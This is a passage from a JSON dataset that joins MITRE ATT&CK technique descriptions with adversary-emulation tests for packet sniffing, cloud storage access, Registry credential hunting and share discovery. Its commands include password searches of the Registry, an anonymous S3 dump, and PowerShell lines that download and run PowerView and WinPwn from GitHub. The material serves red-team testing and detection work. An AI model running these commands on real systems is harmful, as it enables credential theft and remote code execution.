traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)", "atomic_tests": [{"name": "Packet Capture Linux using tshark or tcpdump", "auto_generated_guid": "7fe741f7-b265-4951-a7c7-320889083b3e", "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n", "supported_platforms": ["linux"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "ens33"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if at least one of tcpdump or tshark is installed.\n", "prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"}], "executor": {"command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture FreeBSD using tshark or tcpdump", "auto_generated_guid": "c93f2492-9ebe-44b5-8b45-36574cccfe67", "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n", "supported_platforms": ["linux"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "em0"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if at least one of tcpdump or tshark is installed.\n", "prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y wireshark-nox11)\n"}], "executor": {"command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "name": "sh", "elevation_required": true}}, {"name": "Packet Capture macOS using tcpdump or tshark", "auto_generated_guid": "9d04efee-eff5-4240-b8d2-07792b873608", "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n", "supported_platforms": ["macos"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "en0A"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Check if at least one of tcpdump or tshark is installed.\n", "prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"}], "executor": {"command": "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture Windows Command Prompt", "auto_generated_guid": "a5b2f6a0-24b4-493e-9590-c699f75723ca", "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n", "supported_platforms": ["windows"], "input_arguments": {"interface": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "Ethernet"}, "wireshark_url": {"description": "wireshark installer download URL", "type": "url", "default": "https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe"}, "tshark_path": {"description": "path to tshark.exe", "type": "path", "default": "c:\\program files\\wireshark\\tshark.exe"}, "npcap_url": {"description": "npcap installed download URL", "type": "url", "default": "https://nmap.org/npcap/dist/npcap-1.31.exe"}, "npcap_path": {"description": "path to npcap.sys", "type": "path", "default": "C:\\Program Files\\Npcap\\npcap.sys"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "tshark must be installed and in the default path of \"c:\\Program Files\\Wireshark\\Tshark.exe\".\n", "prereq_command": "if (test-path \"#{tshark_path}\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" #{wireshark_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" /S\n"}, {"description": "npcap must be installed.\n", "prereq_command": "if (test-path \"#{npcap_path}\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\npcap_installer.exe\" #{npcap_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\npcap_installer.exe\"\n"}], "executor": {"command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Internal Packet Capture", "auto_generated_guid": "b5656f67-d67f-4de8-8e62-b5581630f528", "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory", "supported_platforms": ["windows"], "executor": {"command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10", "cleanup_command": "netsh trace stop >nul 2>&1\nTIMEOUT /T 5 >nul 2>&1\ndel %temp%\\trace.etl >nul 2>&1\ndel %temp%\\trace.cab >nul 2>&1", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Internal pktmon capture", "auto_generated_guid": "c67ba807-f48b-446e-b955-e4928cd1bf91", "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/", "supported_platforms": ["windows"], "executor": {"command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n", "cleanup_command": "del %TEMP%\\t1040.etl", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Internal pktmon set filter", "auto_generated_guid": "855fb8b4-b8ab-4785-ae77-09f5df7bff55", "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/", "supported_platforms": ["windows"], "executor": {"command": "pktmon.exe filter add -p 445\n", "cleanup_command": "pktmon filter remove", "name": "command_prompt", "elevation_required": true}}, {"name": "Packet Capture macOS using /dev/bpfN with sudo", "auto_generated_guid": "e6fe5095-545d-4c8b-a0ae-e863914be3aa", "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n", "supported_platforms": ["macos"], "input_arguments": {"ifname": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "en0"}, "csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/macos_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_macos_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "exit 1\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -i #{ifname} -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}, {"name": "Filtered Packet Capture macOS using /dev/bpfN with sudo", "auto_generated_guid": "e2480aee-23f3-4f34-80ce-de221e27cd19", "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n", "supported_platforms": ["macos"], "input_arguments": {"ifname": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "en0"}, "csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/macos_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_macos_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "exit 1\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -f -i #{ifname} -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture FreeBSD using /dev/bpfN with sudo", "auto_generated_guid": "e2028771-1bfb-48f5-b5e6-e50ee0942a14", "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n", "supported_platforms": ["linux"], "input_arguments": {"ifname": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "em0"}, "csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_freebsd_pcapdemo"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "compile C program\n", "prereq_command": "exit 1\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -i #{ifname} -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Filtered Packet Capture FreeBSD using /dev/bpfN with sudo", "auto_generated_guid": "a3a0d4c9-c068-4563-a08d-583bd05b884c", "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n", "supported_platforms": ["linux"], "input_arguments": {"ifname": {"description": "Specify interface to perform PCAP on.", "type": "string", "default": "em0"}, "csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_freebsd_pcapdemo"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "compile C program\n", "prereq_command": "exit 1\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -f -i #{ifname} -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo", "auto_generated_guid": "10c710c9-9104-4d5f-8829-5b65391e2a29", "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n", "supported_platforms": ["linux"], "input_arguments": {"csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_linux_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -a -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo", "auto_generated_guid": "7a0895f0-84c1-4adf-8491-a21510b1d4c1", "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n", "supported_platforms": ["linux"], "input_arguments": {"csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_linux_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -4 -p 6 -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo", "auto_generated_guid": "515575ab-d213-42b1-aa64-ef6a2dd4641b", "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n", "supported_platforms": ["linux"], "input_arguments": {"csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_linux_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -4 -P -p 17 -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}, {"name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo", "auto_generated_guid": "b1cbdf8b-6078-48f5-a890-11ea19d7f8e9", "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n", "supported_platforms": ["linux"], "input_arguments": {"csource_path": {"description": "Path to C program source", "type": "string", "default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"}, "program_path": {"description": "Path to compiled C program", "type": "string", "default": "/tmp/t1040_linux_pcapdemo"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "cc #{csource_path} -o #{program_path}\n"}], "executor": {"command": "sudo #{program_path} -a -f -t 3\n", "cleanup_command": "rm -f #{program_path}\n", "name": "bash", "elevation_required": true}}]}, "T1530": {"name": "Data from Cloud Storage", "technique_id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7", "external_id": "T1530", "data_components": ["Cloud Storage Access"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may access data from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. \n\nIn other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.(Citation: EA Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)\n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.", "atomic_tests": [{"name": "Azure - Enumerate Azure Blobs with MicroBurst", "auto_generated_guid": "3dab4bcc-667f-4459-aea7-4162dd2d6590", "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n", "supported_platforms": ["iaas:azure"], "input_arguments": {"base": {"description": "Azure blob keyword to enumerate (Example, storage account name)", "type": "string", "default": "secure"}, "output_file": {"description": "File to output results to", "type": "string", "default": "$env:temp\\T1530Test1.txt"}, "wordlist": {"description": "File path to keywords for search permutations", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\n"}, {"description": "The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"#{wordlist}\"){exit 0} else {exit 1}\n", "get_prereq_command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"#{wordlist}\"\n"}], "executor": {"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations \"#{wordlist}\" -outputfile \"#{output_file}\"\n", "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n", "name": "powershell"}}, {"name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)", "auto_generated_guid": "146af1f1-b74e-4aa7-9895-505eb559b4b0", "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n", "supported_platforms": ["iaas:azure"], "input_arguments": {"base_name": {"description": "Azure storage account name to test", "type": "string", "default": "T1530Test2"}, "output_file": {"description": "File to output results to", "type": "string", "default": "$env:temp\\T1530Test2.txt"}, "container_name": {"description": "Container name to search for (optional)", "type": "string", "default": null}, "blob_name": {"description": "Blob name to search for (optional)", "type": "string", "default": null}}, "executor": {"command": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n", "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n", "name": "powershell"}}, {"name": "AWS - Scan for Anonymous Access to S3", "auto_generated_guid": "979356b9-b588-4e49-bba4-c35517c484f5", "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n", "supported_platforms": ["iaas:aws"], "input_arguments": {"s3_bucket_name": {"description": "Name of the bucket", "type": "string", "default": "redatomic-test2"}}, "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket #{s3_bucket_name}\naws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"}], "executor": {"command": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n", "cleanup_command": "aws s3 rb s3://#{s3_bucket_name} --force \nrm -rf /tmp/#{s3_bucket_name}\n", "name": "sh", "elevation_required": false}}]}, "T1552.002": {"name": "Credentials in Registry", "technique_id": "attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580", "external_id": "T1552.002", "data_components": ["Command Execution", "Process Creation", "Windows Registry Key Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>", "atomic_tests": [{"name": "Enumeration for Credentials in Registry", "auto_generated_guid": "b6ec082c-7384-46b3-a111-9a9b8b14e5e7", "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "name": "command_prompt"}}, {"name": "Enumeration for PuTTY Credentials in Registry", "auto_generated_guid": "af197fd7-e868-448e-9bd5-05d1bcd9d9e5", "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "name": "command_prompt"}}]}, "T1135": {"name": "Network Share Discovery", "technique_id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f", "external_id": "T1135", "data_components": ["Command Execution", "OS API Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.", "atomic_tests": [{"name": "Network Share Discovery", "auto_generated_guid": "f94b5ad9-911c-4eff-9718-fd21899db4f7", "description": "Network Share Discovery\n", "supported_platforms": ["macos"], "input_arguments": {"computer_name": {"description": "Computer name to find a mount on.", "type": "string", "default": "computer1"}}, "executor": {"command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n", "name": "sh"}}, {"name": "Network Share Discovery - linux", "auto_generated_guid": "875805bc-9e86-4e87-be86-3a5527315cae", "description": "Network Share Discovery using smbstatus\n", "supported_platforms": ["linux"], "input_arguments": {"package_checker": {"description": "Package checking command. Debian - dpkg -s samba", "type": "string", "default": "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"}, "package_installer": {"description": "Package installer command. Debian - apt install samba", "type": "string", "default": "(which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Package with smbstatus (samba) must exist on device\n", "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo #{package_installer} \n"}], "executor": {"command": "sudo smbstatus --shares\n", "name": "bash", "elevation_required": true}}, {"name": "Network Share Discovery - FreeBSD", "auto_generated_guid": "77e468a6-3e5c-45a1-9948-c4b5603747cb", "description": "Network Share Discovery using smbstatus\n", "supported_platforms": ["linux"], "input_arguments": {"package_checker": {"description": "Package checking command. pkg info -x samba", "type": "string", "default": "(pkg info -x samba &>/dev/null)"}, "package_installer": {"description": "Package installer command. pkg install -y samba413", "type": "string", "default": "(which pkg && pkg install -y samba413)"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Package with smbstatus (samba) must exist on device\n", "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n", "get_prereq_command": "#{package_installer} \n"}], "executor": {"command": "smbstatus --shares\n", "name": "sh", "elevation_required": true}}, {"name": "Network Share Discovery command prompt", "auto_generated_guid": "20f1097d-81c1-405c-8380-32174d493bbb", "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Computer name to find a mount on.", "type": "string", "default": "localhost"}}, "executor": {"command": "net view \\\\#{computer_name}\n", "name": "command_prompt"}}, {"name": "Network Share Discovery PowerShell", "auto_generated_guid": "1b0814d1-bb24-402d-9615-1b20c50733fb", "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n", "supported_platforms": ["windows"], "executor": {"command": "get-smbshare\n", "name": "powershell"}}, {"name": "View available share drives", "auto_generated_guid": "ab39a04f-0c93-4540-9ff2-83f862c385ae", "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session", "supported_platforms": ["windows"], "executor": {"command": "net share\n", "name": "command_prompt"}}, {"name": "Share Discovery with PowerView", "auto_generated_guid": "b1636f0a-ba82-435c-b699-0d78794d8bfd", "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Endpoint must be joined to domain\n", "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "\"Join system to domain\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n", "name": "powershell"}}, {"name": "PowerView ShareFinder", "auto_generated_guid": "d07e4cc1-98ae-447e-9d31-36cb430d28c4", "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.", "supported_platforms": ["windows"], "input_arguments": {"parameters": {"description": "ShareFinder parameter", "type": "string", "default": "-CheckShareAccess"}}, "dependencies": [{"description": "Invoke-ShareFinder module must exist in %TEMP% directory", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"}], "executor": {"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n", "name": "powershell"}}, {"name": "WinPwn - shareenumeration", "auto_generated_guid": "987901d1-5b87-4558-a6d9-cffcabc638b8", "description": "Network share enumeration using the shareenumeration function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput", "name": "powershell"}}, {"name": "Network Share Discovery via dir command", "auto_generated_guid": "13daa2cf-195a-43df-a8bd-7dd5ffb607b5", "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n", "supported_platforms": ["windows"], "input_arguments": {"computer_ip": {"description": "Computer IP to find a mount on.", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "dir \\\\#{computer_ip}\\c$\ndir \\\\#{computer_ip}\\admin$\ndir \\\\#{computer_ip}\\IPC$\n", "name": "command_prompt"}}]}, "T1120": {"name": "Peripheral Device Discovery", "technique_id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643", "external_id": "T1120", 